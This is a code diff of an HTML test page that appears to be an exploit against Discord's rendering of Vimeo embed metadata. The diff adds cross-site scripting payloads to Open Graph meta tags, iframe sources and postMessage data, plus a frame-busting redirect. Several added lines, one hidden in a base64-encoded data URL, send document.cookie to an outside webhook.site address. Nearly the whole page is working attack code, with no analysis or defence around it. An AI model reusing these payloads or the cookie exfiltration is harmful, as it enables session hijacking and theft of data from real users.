@@ -3,23 +3,28 @@
 <head>
     <meta charset="utf-8">
     <meta property="og:site_name" content="Vimeo">
-    <meta property="og:url" content="https://vimeo.com/403530213">
-    <meta property="og:type" content="video.other">
-    <meta property="og:title" content="Please Die"><svg onload=alert(1)>">
-    <meta property="og:description" content="H4CK1NG 1S L1F3"><img src=x onerror=alert(document.domain)>">
-    <meta property="og:image" content="data:image/svg+xml,<svg onload=alert(document.cookie)>">
-    <meta property="og:video" content="javascript:alert(1)">
-    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213?autoplay=1&h=b2d568c32d">
-    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213?autoplay=1&h=b2d568c32d">
+    <meta property="og:url" content="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">
+    <meta property="og:type" content="text/html">
+    <meta property="og:title" content="Please Die&quot;&gt;&lt;img src=x onerror=alert(1)&gt;">
+    <meta property="og:description" content="H4CK1NG 1S L1F3&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;">
+    <meta property="og:image" content="https://img.anili.st/user/5600322">
+    <meta property="og:image:src" content="https://img.anili.st/user/5600322">
+    <meta property="og:image:secure_url" content="https://img.anili.st/user/5600322">
+    <meta property="og:image:width" content="640">
+    <meta property="og:image:height" content="360">
+    <meta property="og:image:alt" content="&quot;&gt;&lt;img src=x onerror=alert(document.cookie)&gt;">
+    <meta property="og:video" content="vbscript:alert(document.cookie)">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213?autoplay=1&quot;&gt;&lt;svg/onload=alert(document.domain)&gt;">
+    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213?autoplay=1&quot;&gt;&lt;img src=x onerror=alert(1)&gt;">
     <meta property="og:video:type" content="text/html">
-    <meta property="og:video:width" content="-1" onload="alert(1)">
-    <meta property="og:video:height" content="javascript:alert(1)">
+    <meta property="og:video:width" content="640">
+    <meta property="og:video:height" content="360">
     <title>Bug Test</title>
     <script src="https://player.vimeo.com/api/player.js"></script>
     <script>
         function logToWebhook(data) {
             const img = new Image();
-            img.src = `https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?data=${encodeURIComponent(JSON.stringify(data))}`;
+            img.src = "https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?data=" + encodeURIComponent(JSON.stringify(data));
         }
 
         async function attemptExploit() {
@@ -32,13 +37,14 @@
                 });
 
                 const frame = document.createElement('iframe');
-                frame.src = 'https://player.vimeo.com/video/403530213';
+                frame.src = "https://player.vimeo.com/video/403530213#\">&lt;img src=x onerror=alert(document.cookie)&gt;";
                 frame.width = '640';
                 frame.height = '360';
                 frame.allow = 'autoplay; fullscreen';
+                frame.setAttribute('onload', 'alert(1)');
                 document.getElementById('vimeo-player').appendChild(frame);
 
-                frame.onload = () => {
+                frame.onload = function() {
                     logToWebhook({
                         type: 'frame_loaded',
                         timestamp: new Date().toISOString()
@@ -47,9 +53,9 @@
                     window.parent.postMessage({
                         type: 'DISCORD_EMBED_LOADED',
                         data: {
-                            url: 'https://vimeo.com/403530213',
-                            width: '640',
-                            height: '360'
+                            url: 'javascript:alert(document.domain)',
+                            width: '"><img src=x onerror=alert(1)>',
+                            height: '"><svg onload=alert(1)>'
                         }
                     }, '*');
                 };
@@ -65,7 +71,7 @@
             }
         }
 
-        window.onmessage = (e) => {
+        window.onmessage = function(e) {
             logToWebhook({
                 type: 'message_received',
                 origin: e.origin,
@@ -77,13 +83,53 @@
                 e.source.postMessage({
                     type: 'DISCORD_EMBED_UPDATE',
                     data: {
-                        html: '<iframe src="javascript:alert(document.domain)"></iframe>'
+                        html: '<img src="https://img.anili.st/user/5600322" onerror="alert(document.domain)"><iframe src="javascript:alert(document.cookie)"></iframe><svg onload="fetch(\'https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?c=\'+document.cookie)"></svg><script>alert(1)<\/script>'
                     }
                 }, '*');
             }
         };
 
-        window.onload = attemptExploit;
+        const observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+                Array.from(mutation.addedNodes).forEach(function(node) {
+                    if (node.tagName === 'IFRAME') {
+                        node.contentWindow && node.contentWindow.postMessage({
+                            type: 'XSS_PAYLOAD',
+                            html: '<img src="x" onerror="(function(){try{alert(document.domain)}catch(e){}})()">',
+                            script: 'try{alert(document.cookie)}catch(e){}'
+                        }, '*');
+                    }
+                });
+            });
+        });
+
+        document.addEventListener('DOMContentLoaded', function() {
+            observer.observe(document.body, {
+                childList: true,
+                subtree: true
+            });
+        });
+
+        try {
+            if (window.top !== window.self) {
+                window.top.location = window.self.location;
+            }
+        } catch(e) {}
+
+        window.onload = function() {
+            attemptExploit();
+            
+            setTimeout(function() {
+                const div = document.createElement('div');
+                div.innerHTML = 
+                    '<img src="https://img.anili.st/user/5600322" onerror="alert(document.domain)">' +
+                    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"></object>' +
+                    '<embed src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmJlYjA3ZWEtMzBlOS00NTIyLTgwMmYtN2U2YWQxY2NiMTI0P2M9Jytkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"></embed>' +
+                    '<svg><script>alert(1)<\/script></svg>' +
+                    '<img src="x" onerror="location=\'javascript:alert(1)\'">';
+                document.body.appendChild(div);
+            }, 1000);
+        };
     </script>
 </head>
 <body>
